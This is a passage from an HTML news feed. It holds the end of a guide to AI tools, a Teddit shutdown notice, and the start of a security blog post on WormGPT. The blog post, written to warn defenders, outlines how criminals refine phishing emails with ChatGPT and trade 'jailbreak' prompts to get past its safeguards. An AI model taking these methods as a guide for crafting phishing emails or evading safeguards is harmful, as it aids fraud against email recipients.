https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Prompt: “Fashion photoshoot of sneakers inspired by Van Gogh” - the first images that were created by each model</figcaption></figure></div><p><em>Some things to worry about:</em><span> These systems are built around models that have built-in biases due to their training on Internet data (if you ask it to create a picture of an entrepreneur, for example, you will likely see more pictures featuring men than women, unless you specify “female entrepreneur”), you can use </span><a href="https://huggingface.co/spaces/society-ethics/DiffusionBiasExplorer" rel="">this explorer</a><span> to see these biases at work. </span></p><p><span>These systems are also trained on existing art on the internet in ways that are not transparent and </span><a href="https://www.nytimes.com/2022/09/02/technology/ai-artificial-intelligence-artists.html" rel="">potentially legally and ethically questionable</a><span>. Though technically you own copyright of the images created, legal rules are still hazy.</span></p><p>Also, right now, they don’t create text, just a bunch of stuff that looks like text. But Midjourney has nailed hands.</p><p><strong>Best free option:</strong><span> </span><a href="https://www.bing.com/search?q=Bing+AI&amp;showconv=1&amp;FORM=hpcodx" rel="">Bing</a><br><strong>Paid option: </strong><a href="https://chat.openai.com/chat" rel="">ChatGPT</a><span> 4.0, but Bing is likely better because of its internet connections</span></p><p>Despite of (or in fact, because of) all its constraints and weirdness, AI is perfect for idea generation. You often need to have a lot of ideas to have good ideas, and AI is good at volume. With the right prompting, you can also force it to be very creative. Ask Bing in creative mode to look up your favorite unusual idea generation techniques, like Brian Eno's oblique strategies or Mashall McLuhan's tetrads, and apply them. Or ask for something weird, like ideas inspired by a random patent, or your favorite superhero…</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png" width="1456" height="496" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:496,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:4215384,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F62d8bc29-d7dd-4355-aa59-5543466317d3_4800x1634.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong>Best animation tool:</strong><span> </span><a href="https://www.d-id.com/" rel="">D-i</a><span>D for animating faces in videos. </span><a href="https://app.runwayml.com/" rel="">Runway v2</a><span> for creating videos from text</span><br><strong>Best voice cloning:</strong><span> </span><a href="https://beta.elevenlabs.io/speech-synthesis" rel="">ElevenLabs</a></p><p><span>It is now trivial to generate a video with a completely AI generated character, reading a completely AI-written script, talking in an AI-made voice, animated by AI. </span><a href="https://oneusefulthing.substack.com/p/a-quick-and-sobering-guide-to-cloning" rel="">It can also deepfake people, as you can see in this link where I deepfaked myself. Instructions and more information here.</a><span> Use with caution, but this can be great for explainer videos and introductions.</span></p><p>The first commercially available text-to-video tool was also recently released, Runway v2. It creates short 4-second clips, and is more of a demonstration of what is to come, but is worth taking a look at if you want a sense of the future development in this space.</p><p><em>Some things to worry about: </em><span>Deep fakes are a huge concern, and these systems need to be used ethically.</span></p><p><strong>For data (And also any weird ideas you have with code):</strong><span> Code Interpreter</span><br><strong>For documents: </strong><span>Claude 2 for large documents or many documents at once, Bing Sidebar for smaller documents and webpages (the sidebar, part of the Edge browsers can “see” what is in your browser, letting Bing work with that information, though the size of the context window is limited)</span></p><p><a href="https://www.oneusefulthing.org/p/what-ai-can-do-with-a-toolbox-getting" rel="">I wrote about Code Interpreter last week</a><span>. It is a mode of GPT-4 that lets you upload files to the AI, allows the AI to write and run code, and lets you download the results provided by the AI. It can be used to execute programs, run data analysis (though you will need to know enough about statistics and data to check its work), and create all sorts of files, </span><a href="https://twitter.com/prkeshari/status/1678155933606637568?s=20" rel="">web pages</a><span>, and even </span><a href="https://twitter.com/icreatelife/status/1678184683702566922?s=20" rel="">games</a><span>. Though there has been a lot of debate since its release about the risks associated with untrained people using it for analysis, many experts testing Code Interpreter are pretty impressed, </span><a href="https://twitter.com/emollick/status/1678615507128164354?s=20" rel="">to the degree that one paper suggests it will require changing the way we train data scientists.</a><span> Go to my previous post if you want more details on how to use it. I also made an initial prompt to set up Code Interpreter to create useful data visualizations. It gives it some basic principles of good chart design &amp; also reminds it that it can output many kinds of files. You can find that </span><a href="https://t.co/m4yAdKROiJ" rel="">here</a><span>.</span></p><p><span>For working with text, and especially PDFs, Claude 2 is excellent so far. I have pasted in entire books into the previous version of Claude, with impressive results, and the new model is much stronger. You can see my previous experience, and some prompts that might be interesting to use, </span><a href="https://www.oneusefulthing.org/p/what-happens-when-ai-reads-a-book" rel="">here</a><span>. I also gave it numerous complex academic articles and asked it to summarize the results, and it does a good job! Even better, you can then interrogate the material by asking follow-up questions: what is the evidence for that approach? What do the authors conclude? And so on…</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png" width="520" height="434.2857142857143" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/add40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1216,&quot;width&quot;:1456,&quot;resizeWidth&quot;:520,&quot;bytes&quot;:783079,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadd40f64-31fd-4acb-a4ce-97dfbfd8f4b2_1655x1382.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><em>Some things to worry about: </em><span>These systems still hallucinate, though in more limited ways. You need to check over their results if you want to ensure accuracy.</span></p><p><strong>Best free option:</strong><span> </span><a href="https://www.bing.com/search?q=Bing+AI&amp;showconv=1&amp;FORM=hpcodx" rel="">Bing </a><br><strong>Paid option: </strong><span>Usually Bing is best. For children, </span><a href="https://www.khanacademy.org/khan-labs" rel="">Khanmigo </a><span>from Khan Academy offers good AI-driven tutoring powered by GPT-4.</span></p><p><span>If you are going to use AI as a search engine, probably don’t do that. The risk of hallucination is high and most AIs are not connected to the Internet, anyway (which is why I suggest you use Bing. Bard, Google’s AI, hallucinates much more). However, there is some evidence that AI can often provide more useful answers than search when used carefully, </span><a href="https://arxiv.org/abs/2307.01135" rel="">according to a recent pilot study</a><span>. Especially in cases where search engines aren’t very good, </span><a href="https://twitter.com/emollick/status/1643718474668097538?s=20" rel="">like tech support, deciding where to eat, or getting advice</a><span>, Bing is often better than Google as a starting point. This is an area that is evolving rapidly, but you should be careful about these uses for now. </span><a href="https://www.nytimes.com/2023/06/08/nyregion/lawyer-chatgpt-sanctions.html" rel="">You don’t want to get in trouble.</a></p><p><span>But more exciting is the possibility of using AIs to help education, including helping us learn. </span><a href="https://www.oneusefulthing.org/p/assigning-ai-seven-ways-of-using" rel="">I have written about how AI can be used for teaching</a><span> and to </span><a href="https://oneusefulthing.substack.com/p/using-ai-to-make-teaching-easier" rel="">help make teachers’ lives easier and their lessons more effective</a><span>, but it can also work for self-guided learning as well. You can ask the AI to explain concepts and get ver good results. This </span><a href="https://twitter.com/emollick/status/1669434927761313807?s=20" rel="">prompt is a good automated tutor</a><span>, and use can find a </span><a href="https://chat.openai.com/share/ec1018ec-1d86-4160-b587-354253c7d5cb" rel="">direct link to activate the tutor in ChatGPT here</a><span>. Because we know the AI could be hallucinating, you would be wise to (carefully!) double-check any critical data against another source. </span></p><p>Thanks to rapid advances in technology, these are likely the worst AI tools you will ever use, as the past few months of development have shown. I have no doubt I will need to make a new guide soon. But remember two key points that remain true about AI:</p><ul><li><p>AI is a tool. It is not always the right tool. Consider carefully whether, given its weaknesses, it is right for the purpose to which you are planning to apply it.</p></li><li><p>There are many ethical concerns you need to be aware of. AI can be used to infringe on copyright, or to cheat, or to steal the work of others, or to manipulate. And how a particular AI model is built and who benefits from its use are often complex issues, and not particularly clear at this stage. Ultimately, you are responsible for using these tools in an ethical manner.</p></li></ul><p>We are in the early days of a very rapidly advancing revolution. Are there other uses you want to share? Let me know in the comments.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png" width="460" height="288.83720930232556" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:864,&quot;width&quot;:1376,&quot;resizeWidth&quot;:460,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F382ea217-7a23-47f3-bb7f-bbab3dbc9902_1376x864.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>This post is licensed under a </span><a href="http://creativecommons.org/licenses/by-nc/4.0/" rel="">Creative Commons Attribution-NonCommercial 4.0 International License</a><span>. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png" width="88" height="31" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f277459b-606e-4b09-bf79-bdd1b9462720_88x31.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:31,&quot;width&quot;:88,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Creative Commons License&quot;,&quot;title&quot;:&quot;Creative Commons License&quot;,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="Creative Commons License" title="Creative Commons License" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff277459b-606e-4b09-bf79-bdd1b9462720_88x31.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p data-attrs="{&quot;url&quot;:&quot;https://www.oneusefulthing.org/p/how-to-use-ai-to-do-stuff-an-opinionated?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:&quot;button-wrapper&quot;}" data-component-name="ButtonCreateButton"><a href="https://www.oneusefulthing.org/p/how-to-use-ai-to-do-stuff-an-opinionated?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Teddit Is Shutting Down (193 pts)]]></title>
            <link>https://tedd.it/shutdown</link>
            <guid>36742748</guid>
            <pubDate>Sun, 16 Jul 2023 01:51:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tedd.it/shutdown">https://tedd.it/shutdown</a>, See on <a href="https://news.ycombinator.com/item?id=36742748">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>Tedd.it is Shutting Down</h2><h3>On August 1st, 2023, tedd.it will cease its operations and shut down permanently.</h3><p>With the <a href="https://www.theverge.com/2023/6/30/23779519/reddit-third-party-app-shut-down-apollo-sync-baconreader-api-protest">new restrictions on the Reddit API</a> taking place, tedd.it's access to Reddit and its content has been severely limited, effectively rendering the site unusable for more than a handful of users.
This is the cause for the "429 Too Many Requests" errors you see lately.</p><p>Sadly, tedd.it is just one more victim in a long list of <a href="https://www.theverge.com/2023/6/30/23779519/reddit-third-party-app-shut-down-apollo-sync-baconreader-api-protest">projects and apps killed</a> by the changes. This is a deliberate decision by Reddit, with the intent of killing content scrapers and third-party apps unless they pay <a href="https://www.theverge.com/2023/5/31/23743993/reddit-apollo-client-api-cost">enormous, unrealistic fees</a>, simply because they want to cut costs on their infrastructure to protect their bottom line.</p><p>This, unfortunately, leaves me with no choice but to shut down the site permanently. Tedd.it serves thousands of users every month, and is hosted, maintained, and paid for out of my own pocket. I cannot possibly afford the hundreds of thousands of dollars that Reddit now demands for access.</p><p>Reddit has proved once again that all it cares about is its profits and its upcoming IPO, and that it could not care less about its users, moderators, and content creators. To protect its corporate needs, Reddit <a href="https://9to5mac.com/2023/06/15/reddit-blackout-third-party-apps/">ignores community protests</a>, <a href="https://www.npr.org/2023/07/01/1184258201/reddit-api-accessibility-mods">harms accessibility for disabled users</a>, and <a href="https://futurism.com/the-byte/reddit-ceo-threatens-mods">threatens the volunteers who moderate the site</a>.</p><p>To the many users who found tedd.it useful, thank you for using the site. I hope it served you well. I am sad and disappointed that things have to end this way, but alas, the decision has been made for us.</p><p>Stay safe out there 🧡</p><h2>Lemmy is the New Reddit</h2><p>As an alternative to Reddit and tedd.it, I invite you to try <a href="https://join-lemmy.org/">Lemmy</a>, an alternative to Reddit built for the Fediverse. It's free, open source, and not controlled by a company or central entity. Many of those who left Reddit following the chaos have found their home there.</p><p>Here are some instances to try:</p><a href="https://lemmy.world/">lemmy.world</a><a href="https://lemm.ee/">lemm.ee</a><a href="https://lemmy.fmhy.ml/">lemmy.fmhy.ml</a></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[WormGPT – The Generative AI Tool Cybercriminals Are Using (133 pts)]]></title>
            <link>https://slashnext.com/blog/wormgpt-the-generative-ai-tool-cybercriminals-are-using-to-launch-business-email-compromise-attacks/</link>
            <guid>36742725</guid>
            <pubDate>Sun, 16 Jul 2023 01:47:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://slashnext.com/blog/wormgpt-the-generative-ai-tool-cybercriminals-are-using-to-launch-business-email-compromise-attacks/">https://slashnext.com/blog/wormgpt-the-generative-ai-tool-cybercriminals-are-using-to-launch-business-email-compromise-attacks/</a>, See on <a href="https://news.ycombinator.com/item?id=36742725">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="text">
	<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks.png" alt="" width="936" height="500" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks-300x160.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks-768x410.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20500'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks-300x160.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks-768x410.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Generative-AI-BEC-Attacks.png"></p>
<p>In this blog post, we delve into the emerging use of generative AI, including OpenAI’s ChatGPT, and the cybercrime tool WormGPT, in Business Email Compromise (BEC) attacks. Highlighting real cases from cybercrime forums, the post dives into the mechanics of these attacks, the inherent risks posed by AI-driven phishing emails, and the unique advantages of generative AI in facilitating such attacks.</p>
<h2><strong>How Generative AI is Revolutionising BEC Attacks</strong></h2>
<p>The progression of artificial intelligence (AI) technologies, such as OpenAI’s ChatGPT, has introduced a new vector for business email compromise (BEC) attacks. ChatGPT, a sophisticated AI model, generates human-like text based on the input it receives. Cybercriminals can use such technology to automate the creation of highly convincing fake emails, personalised to the recipient, thus increasing the chances of success for the attack.</p>
<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png" alt="Hackers Guide to Sending BEC" width="936" height="480" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-300x154.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-768x394.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20480'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-300x154.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC-768x394.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Guide-to-Sending-BEC.png"></p>
<p>Consider the first image above, where a recent discussion thread unfolded on a cybercrime forum. In this exchange, a cybercriminal showcased the potential of harnessing generative AI to refine an email that could be used in a phishing or BEC attack. They recommended composing the email in one’s native language, translating it, and then feeding it into an interface like ChatGPT to enhance its sophistication and formality. This method introduces a stark implication: attackers, even those lacking fluency in a particular language, are now more capable than ever of fabricating persuasive emails for phishing or BEC attacks.</p>
<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png" alt="Hackers Forum" width="936" height="492" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-300x158.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-768x404.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20492'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-300x158.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum-768x404.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/Hackers-Forum.png"></p>
<p>Moving on to the second image above, we’re now seeing an unsettling trend among cybercriminals on forums, evident in discussion threads offering “jailbreaks” for interfaces like ChatGPT. These “jailbreaks” are specialised prompts that are becoming increasingly common. They refer to carefully crafted inputs designed to manipulate interfaces like ChatGPT into generating output that might involve disclosing sensitive information, producing inappropriate content, or even executing harmful code. The proliferation of such practices underscores the rising challenges in maintaining AI security in the face of determined cybercriminals.</p>
